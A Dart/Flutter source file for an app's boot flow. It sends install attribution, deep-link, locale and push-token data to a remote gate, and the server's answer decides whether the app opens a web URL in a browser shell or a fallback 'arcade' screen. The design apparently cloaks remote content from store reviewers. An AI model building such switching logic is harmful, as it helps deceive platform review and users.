import 'dart:io';
import 'package:firebase_app_check/firebase_app_check.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:video_player/video_player.dart';
import 'config/runtime_brand.dart';
import 'models/launch_route.dart';
import 'screens/browser_shell.dart' deferred as shell;
import 'screens/network_pause_screen.dart';
import 'screens/notify_offer_screen.dart';
import 'services/install_signal_client.dart';
import 'services/network_radar.dart';
import 'services/pulse_dispatch.dart';
import 'services/remote_gate_client.dart';
import 'services/runtime_cache.dart';
import 'services/secure_http.dart';

/// Facade.  Call [GrayBoot.prepare()] once before runApp(),
/// then use [gray.buildHome(fallbackHomeBuilder: ...)].
class GrayBoot {
  final RuntimeCache _cache;
  final NetworkRadar _radar;
  final InstallSignalClient _signal;
  final RemoteGateClient _gate;
  final PulseDispatch _pulse;
  final bool _gateEnabled;

  GrayBoot._({
    required RuntimeCache cache,
    required NetworkRadar radar,
    required InstallSignalClient signal,
    required RemoteGateClient gate,
    required PulseDispatch pulse,
    required bool gateEnabled,
  })  : _cache = cache,
        _radar = radar,
        _signal = signal,
        _gate = gate,
        _pulse = pulse,
        _gateEnabled = gateEnabled;

  static Future<GrayBoot> prepare() async {
    if (kDebugMode) {
      debugPrint('[GrayBoot] gateEnabled=${RuntimeBrand.gateEnabled}');
    }

    try {
      await Firebase.initializeApp();
      await FirebaseAppCheck.instance.activate(
        androidProvider:
            kDebugMode ? AndroidProvider.debug : AndroidProvider.playIntegrity,
      );
    } catch (_) {}

    await secureHttp.warmup();

    final cache = RuntimeCache();
    await cache.bootstrap();

    final radar = NetworkRadar();
    final signal = InstallSignalClient();
    final gate = RemoteGateClient(cache);
    final pulse = PulseDispatch(cache);

    return GrayBoot._(
      cache: cache,
      radar: radar,
      signal: signal,
      gate: gate,
      pulse: pulse,
      gateEnabled: RuntimeBrand.gateEnabled,
    );
  }

  /// Returns the root widget for the [MaterialApp.home] slot.
  Widget buildHome({required WidgetBuilder fallbackHomeBuilder}) {
    if (!_gateEnabled) {
      if (kDebugMode) debugPrint('[GrayBoot] gate disabled — mounting fallback');
      return Builder(builder: fallbackHomeBuilder);
    }
    return _GrayPipeline(
      cache: _cache,
      radar: _radar,
      signal: _signal,
      gate: _gate,
      pulse: _pulse,
      fallbackBuilder: fallbackHomeBuilder,
    );
  }
}

// ---------------------------------------------------------------------------
// Internal pipeline widget — splash UI + boot logic in one widget,
// following the same pattern as greensun_corp LaunchPage.
// ---------------------------------------------------------------------------

enum _BarStage { empty, half, almost, full }

class _GrayPipeline extends StatefulWidget {
  final RuntimeCache cache;
  final NetworkRadar radar;
  final InstallSignalClient signal;
  final RemoteGateClient gate;
  final PulseDispatch pulse;
  final WidgetBuilder fallbackBuilder;

  const _GrayPipeline({
    required this.cache,
    required this.radar,
    required this.signal,
    required this.gate,
    required this.pulse,
    required this.fallbackBuilder,
  });

  @override
  State<_GrayPipeline> createState() => _GrayPipelineState();
}

class _GrayPipelineState extends State<_GrayPipeline> {
  VideoPlayerController? _vid;
  Orientation? _activeOrientation;
  bool _vidSwitching = false;
  bool _videoReady = false;
  int _vidToken = 0;
  _BarStage _bar = _BarStage.empty;
  bool _navigated = false;

  static const _barAssets = {
    _BarStage.empty: 'assets/loading/bar_0.webp',
    _BarStage.half: 'assets/loading/bar_1.webp',
    _BarStage.almost: 'assets/loading/bar_2.webp',
    _BarStage.full: 'assets/loading/bar_3.webp',
  };

  @override
  void initState() {
    super.initState();
    _kickoff();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final orientation = MediaQuery.of(context).orientation;
    if (orientation != _activeOrientation) {
      _ensureVideo(orientation);
    }
  }

  @override
  void dispose() {
    widget.pulse.onTokenRefresh = null;
    _vid?.dispose();
    super.dispose();
  }

  void _setBar(_BarStage b) {
    if (mounted) setState(() => _bar = b);
  }

  Future<void> _ensureVideo(Orientation orientation) async {
    if (_activeOrientation == orientation || _vidSwitching) return;
    _vidSwitching = true;
    _activeOrientation = orientation;
    final token = ++_vidToken;
    final path = orientation == Orientation.landscape
        ? 'assets/loading/splash_landscape.mp4'
        : 'assets/loading/splash_portrait.mp4';

    final old = _vid;
    final ctrl = VideoPlayerController.asset(path);
    _vid = ctrl;

    try {
      await old?.dispose();
      await ctrl.initialize();
      await ctrl.setLooping(true);
      await ctrl.setVolume(0);
      await ctrl.play();
      if (!mounted || _vid != ctrl || token != _vidToken) {
        await ctrl.dispose();
        return;
      }
      if (mounted) setState(() => _videoReady = true);
    } catch (_) {
      await ctrl.dispose();
    } finally {
      _vidSwitching = false;
    }
  }

  // ---------- boot flow ----------

  Future<void> _kickoff() async {
    widget.pulse.onTokenRefresh = (token) async {
      final locale = Platform.localeName.replaceAll('-', '_');
      final body = await widget.signal.composePayload(locale: locale, pushToken: token);
      widget.gate.dispatch(body);
    };
    await widget.pulse.bootstrap().catchError((_) {});

    _setBar(_BarStage.empty);
    final route = widget.cache.readRoute();

    switch (route) {
      case LaunchRoute.web:
        _setBar(_BarStage.half);
        await _returningWebFlow();
        break;
      case LaunchRoute.arcade:
        _setBar(_BarStage.half);
        await _tryRestoreOnline();
        break;
      case LaunchRoute.pristine:
        await _firstLaunchFlow();
        break;
    }
  }

  Future<void> _firstLaunchFlow() async {
    _setBar(_BarStage.empty);
    final hasNet = await widget.radar.hasInternet();
    if (!hasNet) {
      if (!mounted) return;
      _goNoSignal(isFirst: true);
      return;
    }

    _setBar(_BarStage.half);
    await widget.signal.warmup();
    await Future.wait([
      widget.signal.waitForAttribution(),
      widget.signal.waitForDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal
        .composePayload(locale: locale, pushToken: widget.pulse.token);
    final resp = await widget.gate.dispatch(body);

    if (resp.ok && resp.url != null) {
      await widget.cache.writeRoute(LaunchRoute.web);
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(resp.url!);
    } else {
      await widget.cache.writeRoute(LaunchRoute.arcade);
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goFallback();
    }
  }

  Future<void> _returningWebFlow() async {
    final hasNet = await widget.radar.hasInternet();
    if (!hasNet) {
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goNoSignal(isFirst: false);
      return;
    }

    final pushUrl = await widget.cache.consumeOneShotPush();
    if (pushUrl != null) {
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(pushUrl);
      return;
    }

    final savedUrl = await widget.cache.getSavedUrl();

    await widget.signal.warmup();
    await Future.wait([
      widget.signal
          .waitForAttribution()
          .timeout(const Duration(seconds: 10), onTimeout: () => {}),
      widget.signal.waitForDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal
        .composePayload(locale: locale, pushToken: widget.pulse.token);
    final resp = await widget.gate.dispatch(body);

    _setBar(_BarStage.full);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (resp.ok && resp.url != null) {
      _goContent(resp.url!);
    } else if (savedUrl != null) {
      _goContent(savedUrl);
    } else {
      _goNoSignal(isFirst: false);
    }
  }

  Future<void> _tryRestoreOnline() async {
    final hasNet = await widget.radar.hasInternet();
    if (!hasNet) {
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 600));
      if (mounted) _goFallback();
      return;
    }

    await widget.signal.warmup();
    await Future.wait([
      widget.signal
          .waitForAttribution()
          .timeout(const Duration(seconds: 8), onTimeout: () => {}),
      widget.signal.waitForDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal
        .composePayload(locale: locale, pushToken: widget.pulse.token);
    final resp = await widget.gate.dispatch(body);

    if (resp.ok && resp.url != null) {
      await widget.cache.writeRoute(LaunchRoute.web);
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(resp.url!);
    } else {
      _setBar(_BarStage.full);
      await Future.delayed(const Duration(milliseconds: 600));
      if (mounted) _goFallback();
    }
  }

  // ---------- navigation ----------

  Future<void> _goContent(String url) async {
    if (_navigated || !mounted) return;
    _navigated = true;
    await shell.loadLibrary();
    await shell.prepareContentEngine();
    if (!mounted) return;

    if (widget.cache.shouldShowNotifScreen()) {
      Navigator.of(context).pushReplacement(MaterialPageRoute(
        builder: (_) => NotifyOfferScreen(
          cache: widget.cache,
          pulse: widget.pulse,
          radar: widget.radar,
          contentUrl: url,
        ),
      ));
    } else {
      Navigator.of(context).pushReplacement(MaterialPageRoute(
        builder: (_) => shell.BrowserShell(
          url: url,
          cache: widget.cache,
          pulse: widget.pulse,
          radar: widget.radar,
        ),
      ));
    }
  }

  void _goNoSignal({required bool isFirst}) {
    if (_navigated || !mounted) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => NetworkPauseScreen(
        retryBuilder: (_) => _GrayPipeline(
          cache: widget.cache,
          radar: widget.radar,
          signal: widget.signal,
          gate: widget.gate,
          pulse: widget.pulse,
          fallbackBuilder: widget.fallbackBuilder,
        ),
      ),
    ));
  }

  void _goFallback() {
    if (_navigated || !mounted) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: widget.fallbackBuilder),
    );
  }

  // ---------- UI ----------

  @override
  Widget build(BuildContext context) {
    final video = _vid;
    final hasVideo = video != null && video.value.isInitialized;
    final barAsset = _barAssets[_bar]!;

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          if (hasVideo)
            FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: video.value.size.width,
                height: video.value.size.height,
                child: VideoPlayer(video),
              ),
            )
          else
            const DecoratedBox(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [Color(0xFF111522), Color(0xFF05070D)],
                ),
              ),
            ),
          DecoratedBox(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Colors.transparent,
                  Colors.black.withValues(alpha: 0.45),
                  Colors.black.withValues(alpha: 0.65),
                ],
              ),
            ),
          ),
          SafeArea(
            minimum: const EdgeInsets.all(16),
            child: Padding(
              padding: EdgeInsets.symmetric(
                horizontal: MediaQuery.of(context).orientation ==
                        Orientation.landscape
                    ? 48
                    : 24,
              ),
              child: Column(
                children: [
                  const Spacer(),
                  if (_videoReady)
                    AnimatedSwitcher(
                      duration: const Duration(milliseconds: 280),
                      switchInCurve: Curves.easeOut,
                      transitionBuilder: (child, anim) => FadeTransition(
                        opacity: anim,
                        child: ScaleTransition(
                          scale: Tween<double>(begin: 0.985, end: 1.0)
                              .animate(anim),
                          child: child,
                        ),
                      ),
                      child: Image.asset(
                        barAsset,
                        key: ValueKey(barAsset),
                        width: 280,
                        fit: BoxFit.contain,
                        errorBuilder: (context, error, stack) => const SizedBox(height: 24),
                      ),
                    )
                  else
                    const SizedBox(height: 24),
                  const SizedBox(height: 26),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}
